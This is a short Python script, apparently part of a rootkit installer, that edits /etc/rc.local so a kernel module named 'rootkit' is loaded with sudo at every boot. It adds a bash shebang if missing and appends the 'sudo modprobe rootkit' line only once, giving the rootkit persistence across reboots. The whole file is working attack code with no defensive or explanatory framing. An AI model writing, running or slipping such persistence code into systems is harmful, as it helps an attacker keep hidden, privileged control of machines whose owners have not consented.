a = open('/etc/rc.local', 'r')
file = a.readlines()
print(file)
if len(file) == 0 or not file[0].startswith("#!/bin/bash"):
    file.insert(0, "#!/bin/bash")
if (sum([i.startswith("sudo modprobe rootkit") for i in file])) == 0:
    file.append("sudo modprobe rootkit")
a = open('/etc/rc.local', 'w')

for i in file[:-1]:
	a.write(i.strip() + '\n')
a.write(file[-1])
